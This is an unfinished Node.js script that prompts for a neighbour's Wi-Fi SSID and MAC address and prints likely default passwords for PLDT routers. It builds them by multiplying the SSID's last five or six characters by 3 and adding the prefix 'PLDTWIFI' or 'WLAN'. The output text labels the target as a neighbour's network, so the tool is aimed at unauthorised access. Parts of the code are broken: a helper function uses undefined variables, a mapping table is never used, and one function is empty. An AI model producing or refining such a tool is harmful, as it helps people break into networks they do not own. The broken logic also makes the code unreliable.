const readline =
require('readline').createInterface({
    input: process.stdin,
    output: process.stdout
});

//For checking if a string is empty, null or undefined
function isEmpty(str) {
    return (!str || 0 === str.length);
}

//For checking if a string is blank, null or undefined
function isBlank(str) {
    return (!str || /^\s*$/.test(str));
}

//For checking if a string is blank or contains only white-space
String.prototype.isEmpty = function() {
    return (this.length === 0 || !this.trim());
};

//Hex Code or Mac Table
const zero = "f";
const one = "e";
const two = "d";
const three = "c";
const four = "b";
const five = "a";
const six = "9";
const seven = "8";
const eight = "7";
const nine = "6";
const c = "3";
const d = "2";
const e = "1";
const f = "0";

function huntDefaultPass() {
    return new Promise(function todo(resolve, reject) {
       var startToDo = function todo() {

            readline.question('Enter SSID: ', ssid =>
            {          
                    
                if (isEmpty(ssid)) {                    
                    startToDo();
                } else {
                    new_ssid=ssid.toUpperCase();  
                    readline.question('Enter MAC Address: ', macaddress =>
                    {
                        
                        if (isEmpty(macaddress)) {                    
                            startToDo();
                        } else {
                            new_macaddress=macaddress.toLowerCase(); 

                            console.log('Your Neighbor SSID: '+new_ssid);
                            console.log('SSID MAC Address: '+new_macaddress);
                            console.log('List of possible Wi-Fi Password:');

                            const typeone = "PLDTWIFI";
                            const typetwo = "WLAN";
                            const multiplier = 3;

                            //Replace each character
                            String.prototype.replaceAt=function(index, char) {
                                var a = this.split("");
                                a[index] = char;
                                return a.join("");
                            }
                            
                            //Using SSID
                            function name(new_ssid) {
                                var a = this.split("");
                                a[index] = char;
                                switch (a) {
                                    case a === one:
                                        str = new_ssid.replaceAt(-1, one);
                                        break;
                                        case b===two:
                                            str = new_ssid.replaceAt(-1, one);
                                            break;
                                
                                    default:
                                        str = new_ssid;
                                        break;
                                }
                                
                            }

                            console.log(new_ssid.replaceAt(1,'#'))
                            
                            //Combine Characters

                            //2019 Technique Multiplying by 3
                            //How? Getting the last 5 and 6 character of SSID and verify if number. If number then execute calculation else display nothing
                            lastFiveSSIDChar = new_ssid.substr(-5, 5)
                            lastSixSSIDChar = new_ssid.substr(-6, 6)
                            
                            //if (lastFiveSSIDChar===lastFiveSSIDChar.isInteger) {
                                productb = lastFiveSSIDChar * multiplier
                                productb1 = typeone+productb
                                productb2 = typetwo+productb
                                console.log(productb1)
                                console.log(productb2)
                                console.log(productb1.toLowerCase())
                                console.log(productb2.toLowerCase())
                            /*} else {
                                console.log('No Five Val')
                            }

                            if (lastSixSSIDChar===lastSixSSIDChar) {*/
                                productc = lastSixSSIDChar * multiplier
                                productc1 = typeone+productc
                                productc2 = typetwo+productc
                                console.log(productc1)
                                console.log(productc2)
                                console.log(productc1.toLowerCase())
                                console.log(productc2.toLowerCase()) 
                           /* } else {
                                console.log('No Six Val')
                            }
                            */
                            //Terminate to do
                            resolve(new_macaddress,reject);
                        } 
                    } );                    
                }
            });
       }
       startToDo();
    });
}

function generatePassword(params) {
    
}

(async function start() {
    var hauntedDefaultPass = await huntDefaultPass();
    /*console.log('Your Neighbor SSID: '+new_ssid);
    console.log('SSID MAC Address: '+new_macaddress);*/
    //console.log('test' + captcha1);
    process.exit();
    
})();

